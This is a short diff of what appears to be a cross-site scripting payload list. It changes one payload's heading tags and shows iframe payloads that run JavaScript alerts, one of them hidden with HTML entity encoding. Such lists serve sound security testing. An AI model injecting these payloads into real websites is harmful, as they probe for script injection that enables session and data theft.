@@ -10,7 +10,7 @@
 
 
 <IFRAME SRC="javascript:alert('Window.document.cookie');"></IFRAME>
-"><h1><IFRAME SRC="javascript:alert('xss');"></IFRAME>">girl</h1>
+"><h2><IFRAME SRC="javascript:alert('xss');"></IFRAME>">girl</h2>
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 
 
